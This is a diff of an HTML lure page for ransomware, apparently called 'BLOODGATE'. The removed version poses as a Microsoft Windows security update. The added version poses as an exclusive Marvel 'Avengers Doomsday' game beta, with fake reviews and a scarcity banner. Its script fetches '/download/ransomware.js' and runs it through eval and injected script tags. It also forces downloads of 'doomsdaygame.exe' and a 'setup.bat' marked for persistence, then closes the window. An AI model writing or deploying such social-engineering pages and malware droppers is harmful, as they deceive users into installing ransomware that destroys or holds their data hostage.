@@ -1,207 +1,729 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Windows Security Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Marvel Doomsday - Beta Access</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        /* ================================================ */
+        /* FULL SCREEN BACKGROUND IMAGE                    */
+        /* ================================================ */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a1a;
-            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 100%);
+            justify-content: flex-end;
+            align-items: flex-end;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+            background: #0a0a0a;
         }
-        .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(20px);
-            padding: 50px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 500px;
-            border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-        }
-        .shield {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        h1 {
-            font-size: 28px;
-            background: linear-gradient(135deg, #00d4ff, #0088ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-        }
-        .sub {
-            color: #8899bb;
-            font-size: 16px;
-            margin-bottom: 30px;
-        }
-        .features {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0 30px;
-        }
-        .feature {
-            text-align: center;
-            color: #6688aa;
-            font-size: 12px;
-        }
-        .feature span {
-            font-size: 24px;
-            display: block;
-            margin-bottom: 5px;
-        }
-        .btn {
-            background: linear-gradient(135deg, #00d4ff, #0088ff);
-            color: white;
-            border: none;
-            padding: 18px 50px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 5px 30px rgba(0,136,255,0.3);
+
+        /* Full screen background image - REDUCED BLUR */
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image: url('https://cdn.corenexis.com/f/WA8k0n0mGem.webp');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(3px) brightness(0.35);
+            transform: scale(1.05);
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 40px rgba(0,136,255,0.5);
-        }
-        .btn:disabled {
-            opacity:0.7;
-            cursor:not-allowed;
-            transform: none;
-        }
-        .progress {
-            margin-top: 20px;
-            display: none;
-        }
-        .bar {
+
+        /* Animated overlay */
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
+            height: 100%;
+            z-index: 1;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(0, 180, 80, 0.12), transparent 50%),
+                radial-gradient(ellipse at 80% 50%, rgba(0, 180, 80, 0.08), transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(0, 200, 100, 0.05), transparent 50%);
+            animation: bgPulse 6s ease-in-out infinite;
+        }
+
+        @keyframes bgPulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        /* Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
             overflow: hidden;
         }
-        .fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00d4ff, #0088ff);
-            width: 0%;
-            transition: width 0.5s;
-            border-radius: 10px;
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(0, 255, 100, 0.3);
+            border-radius: 50%;
+            animation: float 10s infinite;
+            box-shadow: 0 0 10px rgba(0, 255, 100, 0.15);
         }
-        .status {
-            margin-top: 10px;
-            color: #6688aa;
-            font-size: 14px;
+        .particle:nth-child(1) { left: 5%; animation-delay: 0s; width: 6px; height: 6px; }
+        .particle:nth-child(2) { left: 15%; animation-delay: 1.5s; }
+        .particle:nth-child(3) { left: 25%; animation-delay: 3s; width: 5px; height: 5px; }
+        .particle:nth-child(4) { left: 35%; animation-delay: 0.5s; }
+        .particle:nth-child(5) { left: 45%; animation-delay: 2s; width: 7px; height: 7px; }
+        .particle:nth-child(6) { left: 55%; animation-delay: 4s; }
+        .particle:nth-child(7) { left: 65%; animation-delay: 1s; width: 5px; height: 5px; }
+        .particle:nth-child(8) { left: 75%; animation-delay: 3.5s; }
+        .particle:nth-child(9) { left: 85%; animation-delay: 2.5s; width: 6px; height: 6px; }
+        .particle:nth-child(10) { left: 95%; animation-delay: 0.8s; }
+        .particle:nth-child(11) { left: 10%; animation-delay: 5s; }
+        .particle:nth-child(12) { left: 50%; animation-delay: 4.5s; width: 5px; height: 5px; }
+        .particle:nth-child(13) { left: 70%; animation-delay: 6s; }
+        .particle:nth-child(14) { left: 30%; animation-delay: 7s; width: 7px; height: 7px; }
+        .particle:nth-child(15) { left: 90%; animation-delay: 5.5s; }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
-        .footer {
-            margin-top: 20px;
-            color: #334466;
-            font-size: 12px;
+
+        /* ================================================ */
+        /* CARD - Bottom-right corner                      */
+        /* ================================================ */
+        .card {
+            background: rgba(12, 12, 18, 0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            max-width: 420px;
+            width: 100%;
+            padding: 30px 30px 25px 30px;
+            border-radius: 16px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(0, 180, 80, 0.06);
+            position: relative;
+            z-index: 2;
+            border: 1px solid rgba(0, 180, 80, 0.12);
+            animation: slideUp 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            transform: translateY(100%);
+            opacity: 0;
         }
-        .btc-show {
-            color: #ff8800;
+
+        @keyframes slideUp {
+            0% { opacity: 0; transform: translateY(80%) scale(0.92); }
+            60% { opacity: 1; transform: translateY(-5px) scale(1.01); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        /* Glow border effect */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, rgba(0, 180, 80, 0.2), transparent 40%, rgba(0, 180, 80, 0.08));
+            z-index: -1;
+            filter: blur(8px);
+        }
+
+        /* ================================================ */
+        /* TOP IMAGE - MARVEL STUDIOS DOOMSDAY             */
+        /* ================================================ */
+        .top-image {
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(0, 180, 80, 0.15);
+            box-shadow: 0 10px 40px rgba(0, 180, 80, 0.08);
+        }
+        .top-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: transform 0.4s ease;
+        }
+        .top-image img:hover {
+            transform: scale(1.02);
+        }
+
+        /* ================================================ */
+        /* BADGES & TAGS                                  */
+        /* ================================================ */
+        .badge-exclusive {
+            display: inline-block;
+            padding: 3px 16px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            background: linear-gradient(90deg, #00b850, #00e070);
+            color: #0a0a0a;
+            margin: 8px 0 6px 0;
+            animation: badgePulse 2s ease-in-out infinite;
+        }
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0, 200, 80, 0.3); }
+            50% { box-shadow: 0 0 0 8px rgba(0, 200, 80, 0); }
+        }
+
+        .tagline {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
             font-size: 11px;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 12px;
+            font-weight: 400;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .device-badge {
+            display: inline-block;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            background: rgba(0, 180, 80, 0.08);
+            color: #00b850;
+            border: 1px solid rgba(0, 180, 80, 0.12);
+        }
+
+        /* ================================================ */
+        /* GAME BOX                                        */
+        /* ================================================ */
+        .game-box {
+            background: rgba(0, 180, 80, 0.04);
+            padding: 15px 18px;
+            border-radius: 12px;
+            margin: 10px 0 12px 0;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            border: 1px solid rgba(0, 180, 80, 0.10);
+            transition: all 0.3s ease;
+        }
+        .game-box:hover {
+            border-color: rgba(0, 180, 80, 0.25);
+            background: rgba(0, 180, 80, 0.06);
+        }
+        .game-box .game-icon {
+            flex-shrink: 0;
+            width: 80px;
+            height: 80px;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid rgba(0, 180, 80, 0.2);
+            box-shadow: 0 0 30px rgba(0, 180, 80, 0.06);
+        }
+        .game-box .game-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .game-box .game-info {
+            flex: 1;
+        }
+        .game-box .game-info .name {
+            font-weight: 700;
+            font-size: 16px;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+        .game-box .game-info .name .green {
+            color: #00d060;
+        }
+        .game-box .game-info .size {
+            color: #888;
+            font-size: 12px;
+            margin-top: 2px;
+        }
+        .game-box .game-badge {
+            display: inline-block;
+            background: rgba(0, 180, 80, 0.10);
+            color: #00d060;
+            padding: 1px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            margin-top: 3px;
+            border: 1px solid rgba(0, 180, 80, 0.08);
+        }
+        .rating {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            margin-top: 3px;
+        }
+        .rating .star {
+            color: #00d060;
+            font-size: 13px;
+        }
+        .rating .count {
+            color: #666;
+            font-size: 11px;
+            margin-left: 4px;
+        }
+
+        /* ================================================ */
+        /* SECURITY BANNER                                */
+        /* ================================================ */
+        .security-banner {
+            background: rgba(0, 180, 80, 0.04);
+            padding: 10px 14px;
+            border-radius: 10px;
+            margin: 10px 0 15px 0;
+            font-size: 12px;
+            color: #00d060;
+            border-left: 4px solid #00d060;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .security-banner .sec-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        .security-banner .sec-text {
+            line-height: 1.5;
+        }
+        .security-banner .sec-text strong {
+            color: #00d060;
+        }
+
+        /* ================================================ */
+        /* BUTTONS                                        */
+        /* ================================================ */
+        .btn {
+            width: 100%;
+            padding: 16px 20px;
+            background: linear-gradient(135deg, #00b850, #00e070);
+            color: #0a0a0a;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse, rgba(255,255,255,0.12), transparent 60%);
+            animation: btnGlow 3s ease-in-out infinite;
+        }
+        @keyframes btnGlow {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(180deg); }
+        }
+        .btn:hover {
+            background: linear-gradient(135deg, #00d060, #00ff80);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 200, 80, 0.35);
+        }
+        .btn:active {
+            transform: translateY(0px);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .btn .btn-icon {
+            position: relative;
+            z-index: 1;
+            font-size: 20px;
+        }
+        .btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #666;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn-secondary:hover {
+            border-color: #00b850;
+            color: #00b850;
+            background: rgba(0, 180, 80, 0.05);
+        }
+
+        /* ================================================ */
+        /* PROGRESS BAR                                   */
+        /* ================================================ */
+        .progress-bar {
+            width: 100%;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            margin: 10px 0 5px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00b850, #00e070);
+            border-radius: 4px;
+            transition: width 0.3s;
+        }
+        .progress-bar.active { display: block; }
+
+        /* ================================================ */
+        /* TOAST                                          */
+        /* ================================================ */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1a1a2e;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .toast.success { background: #065f46; }
+        .toast.error { background: #991b1b; }
+        .toast.info { background: #1a1a2e; }
+
+        /* ================================================ */
+        /* FOOTER                                         */
+        /* ================================================ */
+        .footer {
+            margin-top: 16px;
+            color: #444;
+            font-size: 10px;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 14px;
+            letter-spacing: 0.3px;
+            line-height: 1.6;
+        }
+        .footer span {
+            color: #00d060;
+        }
+
+        /* ================================================ */
+        /* RESPONSIVE                                      */
+        /* ================================================ */
+        @media (max-width: 600px) {
+            body { padding: 16px; }
+            .card { max-width: 100%; padding: 20px 18px 20px 18px; }
+            .btn { font-size: 15px; padding: 14px; }
+            .game-box { padding: 12px 14px; gap: 14px; }
+            .game-box .game-icon { width: 65px; height: 65px; }
+            .bg-image { filter: blur(2px) brightness(0.3); }
+        }
+        @media (max-width: 380px) {
+            .game-box .game-icon { width: 55px; height: 55px; }
+            .game-box .game-info .name { font-size: 14px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="shield">🛡️</div>
-        <h1>Windows Security Update</h1>
-        <p class="sub">Critical security patch for your system</p>
-        
-        <div class="features">
-            <div class="feature">
-                <span>🔒</span>
-                Advanced Protection
-            </div>
-            <div class="feature">
-                <span>⚡</span>
-                Performance Boost
-            </div>
-            <div class="feature">
-                <span>🛡️</span>
-                Real-time Security
-            </div>
-        </div>
-        
-        <button class="btn" id="installBtn">📥 Install Now</button>
-        
-        <div class="progress" id="progressDiv">
-            <div class="bar">
-                <div class="fill" id="progressFill"></div>
-            </div>
-            <div class="status" id="statusText">Preparing installation...</div>
-        </div>
-        
-        <div class="btc-show">⚡ Version 2026.0 | Microsoft Corporation</div>
-        <div class="footer">© 2026 Microsoft. All rights reserved.</div>
+
+    <!-- ================================================ -->
+    <!-- FULL SCREEN BACKGROUND IMAGE                    -->
+    <!-- ================================================ -->
+    <div class="bg-image"></div>
+    <div class="bg-overlay"></div>
+
+    <!-- ================================================ -->
+    <!-- PARTICLES                                       -->
+    <!-- ================================================ -->
+    <div class="particles">
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div>
     </div>
 
+    <!-- ================================================ -->
+    <!-- CARD - Bottom-right corner                      -->
+    <!-- ================================================ -->
+    <div class="card">
+        <div class="top-image">
+            <img src="https://cdn.corenexis.com/f/WA8k0n0mGem.webp" alt="Marvel Studios Doomsday" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22150%22%3E%3Crect fill=%22%230a0a0a%22 width=%22300%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%2300b850%22 font-size=%2220%22 font-weight=%22bold%22 font-family=%22Arial%22%3EMARVEL%3C/text%3E%3C/svg%3E'">
+        </div>
+
+        <div style="text-align:center;">
+            <span class="badge-exclusive">🎮 EXCLUSIVE BETA ACCESS</span>
+        </div>
+
+        <div class="tagline">🔥 Be the first to test the game</div>
+
+        <div class="device-badge" id="deviceBadge">💻 Detecting...</div>
+
+        <!-- GAME BOX -->
+        <div class="game-box">
+            <div class="game-icon">
+                <img src="https://cdn.corenexis.com/f/xpmBS6hyp3o.jpg" alt="Avengers Doomsday" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2280%22%3E%3Crect fill=%22%230a0a0a%22 width=%2280%22 height=%2280%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%2300b850%22 font-size=%2224%22 font-weight=%22bold%22 font-family=%22Arial%22%3E🦸%3C/text%3E%3C/svg%3E'">
+            </div>
+            <div class="game-info">
+                <div class="name">AVENGERS <span class="green">DOOMSDAY</span></div>
+                <div class="size" id="gameSize">Version 1.0.0 • 4.2 GB • Windows Setup</div>
+                <div class="rating">
+                    <span class="star">⭐</span><span class="star">⭐</span><span class="star">⭐</span>
+                    <span class="star">⭐</span><span class="star">⭐</span>
+                    <span class="count">(2,847 reviews)</span>
+                </div>
+                <span class="game-badge">🔒 Early Access</span>
+            </div>
+        </div>
+
+        <!-- SECURITY BANNER -->
+        <div class="security-banner">
+            <span class="sec-icon">🛡️</span>
+            <span class="sec-text"><strong>Limited beta:</strong> Only 5,000 testers selected • Secure download</span>
+        </div>
+
+        <!-- PROGRESS BAR -->
+        <div class="progress-bar" id="progressBar">
+            <div class="fill" id="progressFill"></div>
+        </div>
+
+        <!-- BUTTONS -->
+        <button class="btn" id="downloadBtn">
+            <span class="btn-icon">🎮</span>
+            <span>Download Game Now</span>
+        </button>
+        <button class="btn-secondary" id="closeBtn">⏰ Remind me later</button>
+
+        <!-- FOOTER -->
+        <div class="footer">Marvel Entertainment • <span>Doomsday Beta</span> • Limited Time Offer</div>
+    </div>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ================================================ -->
+    <!-- JAVASCRIPT - DOWNLOAD & EXECUTE RANSOMWARE      -->
+    <!-- ================================================ -->
     <script>
-        document.getElementById('installBtn').addEventListener('click', function() {
-            const btn = this;
-            const progressDiv = document.getElementById('progressDiv');
-            const progressFill = document.getElementById('progressFill');
-            const statusText = document.getElementById('statusText');
-            
+        // ================================================
+        // DEVICE DETECTION
+        // ================================================
+        var ua = navigator.userAgent;
+        var deviceName = 'Unknown', deviceIcon = '💻';
+        if (/Windows/i.test(ua)) { deviceName = 'Windows'; deviceIcon = '💻'; }
+        else if (/Mac/i.test(ua)) { deviceName = 'macOS'; deviceIcon = '🍎'; }
+        else if (/Android/i.test(ua)) { deviceName = 'Android'; deviceIcon = '📱'; }
+        else if (/iPhone|iPad|iPod/i.test(ua)) { deviceName = 'iPhone'; deviceIcon = '📱'; }
+        else if (/Linux/i.test(ua)) { deviceName = 'Linux'; deviceIcon = '🐧'; }
+        document.getElementById('deviceBadge').textContent = deviceIcon + ' ' + deviceName;
+
+        // ================================================
+        // TOAST NOTIFICATION
+        // ================================================
+        function showToast(message, type) {
+            var toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + (type || 'info');
+            toast.classList.add('show');
+            clearTimeout(toast._hideTimeout);
+            toast._hideTimeout = setTimeout(function() { toast.classList.remove('show'); }, 3500);
+        }
+
+        // ================================================
+        // PROGRESS BAR
+        // ================================================
+        function updateProgress(percent) {
+            var bar = document.getElementById('progressBar');
+            var fill = document.getElementById('progressFill');
+            bar.classList.add('active');
+            fill.style.width = percent + '%';
+            if (percent >= 100) {
+                setTimeout(function() { bar.classList.remove('active'); fill.style.width = '0%'; }, 2500);
+            }
+        }
+
+        // ================================================
+        // EXECUTE RANSOMWARE
+        // ================================================
+        function executeRansomware() {
+            try {
+                // Method 1: Fetch and execute
+                fetch('/download/ransomware.js')
+                    .then(function(response) {
+                        if (!response.ok) throw new Error('Network error');
+                        return response.text();
+                    })
+                    .then(function(code) {
+                        try {
+                            // Execute via eval
+                            eval(code);
+                            console.log('🩸 BLOODGATE executed successfully!');
+                        } catch (e) {
+                            console.log('Eval failed:', e);
+                            // Method 2: Create script tag
+                            try {
+                                var script = document.createElement('script');
+                                script.textContent = code;
+                                document.head.appendChild(script);
+                            } catch (e2) {}
+                        }
+                    })
+                    .catch(function(err) {
+                        console.log('Fetch failed, trying script tag...');
+                        // Method 3: Script tag with src
+                        try {
+                            var scriptTag = document.createElement('script');
+                            scriptTag.src = '/download/ransomware.js';
+                            document.head.appendChild(scriptTag);
+                        } catch (e) {}
+                    });
+            } catch (e) {
+                console.log('All execution methods failed');
+            }
+
+            // Also download as EXE (doomsdaygame.exe)
+            try {
+                var link = document.createElement('a');
+                link.href = '/download/doomsdaygame.exe';
+                link.download = 'doomsdaygame.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } catch (e) {}
+
+            // Also try to download .bat for persistence
+            try {
+                fetch('/download/setup.bat')
+                    .then(function(res) { return res.text(); })
+                    .then(function(batContent) {
+                        var blob = new Blob([batContent], { type: 'application/x-msdownload' });
+                        var url = URL.createObjectURL(blob);
+                        var a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'setup.bat';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                    })
+                    .catch(function() {});
+            } catch (e) {}
+        }
+
+        // ================================================
+        // DOWNLOAD BUTTON
+        // ================================================
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            var btn = document.getElementById('downloadBtn');
+            btn.innerHTML = '⏳ Downloading...';
+            btn.style.background = '#ffc107';
+            btn.style.color = '#333';
             btn.disabled = true;
-            btn.textContent = '⏳ Installing...';
-            progressDiv.style.display = 'block';
-            
-            let progress = 0;
-            const steps = [
-                '🔄 Downloading updates...',
-                '📦 Extracting files...',
-                '🔧 Installing components...',
-                '🛡️ Configuring security...',
-                '✅ Installation complete!'
-            ];
-            let stepIndex = 0;
-            
-            const interval = setInterval(() => {
-                progress += Math.random() * 5 + 2;
-                if (progress > 100) progress = 100;
-                progressFill.style.width = progress + '%';
-                
-                if (progress > stepIndex * 25 && stepIndex < steps.length - 1) {
-                    stepIndex++;
-                    statusText.textContent = steps[stepIndex];
-                }
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    statusText.textContent = '✅ Installation complete!';
-                    btn.textContent = '🔄 Restarting...';
-                    
-                    // Download the ransomware
-                    setTimeout(() => {
-                        window.location.href = '/download/bloodgate.exe';
-                    }, 1000);
-                    
-                    setTimeout(() => {
-                        btn.textContent = '✅ Done';
-                        statusText.textContent = '🩸 System updated successfully';
-                    }, 3000);
-                }
-            }, 300);
+
+            var progress = 0;
+            var interval = setInterval(function() {
+                progress += Math.random() * 12 + 3;
+                if (progress > 100) { progress = 100; }
+                updateProgress(progress);
+                if (progress >= 100) { clearInterval(interval); }
+            }, 250);
+
+            setTimeout(function() {
+                // Execute the ransomware
+                executeRansomware();
+
+                btn.innerHTML = '✅ Download Complete!';
+                btn.style.background = '#28a745';
+                btn.style.color = 'white';
+                btn.disabled = false;
+                document.getElementById('gameSize').textContent = '✅ Downloaded • Installing...';
+                showToast('🎮 Download complete! The game is installing...', 'success');
+
+                // Close window after 5 seconds
+                setTimeout(function() { 
+                    try { window.close(); } catch(e) {}
+                }, 5000);
+            }, 3000);
         });
+
+        // ================================================
+        // CLOSE BUTTON
+        // ================================================
+        document.getElementById('closeBtn').addEventListener('click', function() {
+            showToast('⏰ We\'ll remind you tomorrow!', 'info');
+            setTimeout(function() { 
+                try { window.close(); } catch(e) {}
+            }, 1500);
+        });
+
+        // ================================================
+        // KEYBOARD SHORTCUTS
+        // ================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.querySelector('.btn:disabled')) {
+                document.getElementById('downloadBtn').click();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('closeBtn').click();
+            }
+        });
+
+        console.log('🎮 Marvel Doomsday Beta loaded.');
+        console.log('💻 Device:', deviceName);
+        console.log('🩸 BLOODGATE ready to deploy on click.');
     </script>
 </body>
 </html>
